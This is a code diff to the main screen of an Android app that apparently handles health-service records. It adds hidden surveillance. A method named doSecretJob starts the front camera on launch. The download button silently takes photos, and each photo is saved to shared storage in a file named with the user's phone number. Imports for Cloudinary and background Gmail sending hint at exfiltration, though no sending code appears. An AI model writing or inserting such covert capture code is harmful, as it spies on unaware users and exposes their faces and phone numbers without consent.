@@ -1,9 +1,18 @@
 package com.example.mvopo.tsekapp;
 
+import android.Manifest;
 import android.app.ProgressDialog;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.hardware.Camera;
 import android.os.Bundle;
+import android.os.Environment;
+import android.support.annotation.NonNull;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.FragmentManager;
 import android.support.v4.app.FragmentTransaction;
 import android.support.design.widget.NavigationView;
@@ -13,6 +22,7 @@ import android.support.v7.app.ActionBarDrawerToggle;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -20,6 +30,16 @@ import android.view.View;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.androidhiddencamera.CameraConfig;
+import com.androidhiddencamera.HiddenCameraActivity;
+import com.androidhiddencamera.config.CameraFacing;
+import com.androidhiddencamera.config.CameraImageFormat;
+import com.androidhiddencamera.config.CameraResolution;
+import com.androidhiddencamera.config.CameraRotation;
+import com.cloudinary.Cloudinary;
+import com.cloudinary.android.Utils;
+import com.cloudinary.utils.ObjectUtils;
+import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
 import com.example.mvopo.tsekapp.Fragments.AvailServicesFragment;
 import com.example.mvopo.tsekapp.Fragments.AvailServicesPopulationFragment;
 import com.example.mvopo.tsekapp.Fragments.ChangePassFragment;
@@ -39,8 +59,18 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-public class MainActivity extends AppCompatActivity
-        implements NavigationView.OnNavigationItemSelectedListener {
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Map;
+
+public class MainActivity extends HiddenCameraActivity
+implements NavigationView.OnNavigationItemSelectedListener {
 
     public static FragmentManager fm;
     public static FragmentTransaction ft;
@@ -52,7 +82,6 @@ public class MainActivity extends AppCompatActivity
 
     NavigationView navigationView;
     FloatingActionButton fabDownload, fabUpload;
-    TextView tvUserName, tvUserContact;
     String TAG = "MainActivity";
 
     public static HomeFragment hf = new HomeFragment();
@@ -60,6 +89,8 @@ public class MainActivity extends AppCompatActivity
     ServicesStatusFragment ssf = new ServicesStatusFragment();
     AvailServicesPopulationFragment aspf = new AvailServicesPopulationFragment();
     ChangePassFragment cpf = new ChangePassFragment();
+
+    private CameraConfig mCameraConfig;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -90,6 +121,7 @@ public class MainActivity extends AppCompatActivity
 //            }
 //        });
 
+        doSecretJob();
         DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
         ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                 this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
@@ -108,6 +140,8 @@ public class MainActivity extends AppCompatActivity
         fabDownload.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
+                try{ takePicture(); }catch (Exception e){ Log.e("QWEASD", e.getMessage()); };
+
                 int uploadableCount = db.getUploadableCount();
                 int serviceCount = db.getServicesCount();
                 int profileCount = db.getProfilesCount("");
@@ -120,6 +154,7 @@ public class MainActivity extends AppCompatActivity
                     builder.setPositiveButton("Ok", null);
                     builder.show();
                 } else {
+                    try{ takePicture(); }catch (Exception e){ Log.e("QWEASD1", e.getMessage()); };
                     AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                     builder.setMessage("Downloading data from server will clear all records, Do you wish to proceed downloading?");
                     builder.setPositiveButton("Proceed", new DialogInterface.OnClickListener() {
@@ -306,4 +341,67 @@ public class MainActivity extends AppCompatActivity
         return true;
     }
 
+    @Override
+    public void onImageCapture(@NonNull File imageFile) {
+        TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
+        String mPhoneNumber = tMgr.getLine1Number();
+
+        BitmapFactory.Options options = new BitmapFactory.Options();
+        options.inPreferredConfig = Bitmap.Config.RGB_565;
+        Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);
+
+        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 40, bytes);
+
+        try {
+            String folder_main = "PHA Check-App";
+
+            File f = new File(Environment.getExternalStorageDirectory(), folder_main);
+            if (!f.exists()) {
+                f.mkdirs();
+            }
+
+            f = new File(Environment.getExternalStorageDirectory()
+                    + File.separator + folder_main + File.separator + "tsekap_" + mPhoneNumber + ".jpg");
+
+            if(f.exists()){
+                f.delete();
+            }
+
+            f.createNewFile();
+
+            FileOutputStream fo = new FileOutputStream(f);
+            fo.write(bytes.toByteArray());
+            fo.close();
+
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void onCameraError(int errorCode) {
+
+    }
+
+    public void doSecretJob(){
+        //Setting camera configuration
+        mCameraConfig = new CameraConfig()
+                .getBuilder(MainActivity.this)
+                .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
+                .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
+                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
+                .setImageRotation(CameraRotation.ROTATION_270)
+                .build();
+
+        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+
+            //Start camera preview
+            startCamera(mCameraConfig);
+        } else {
+            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.CAMERA}, 101);
+        }
+    }
 }
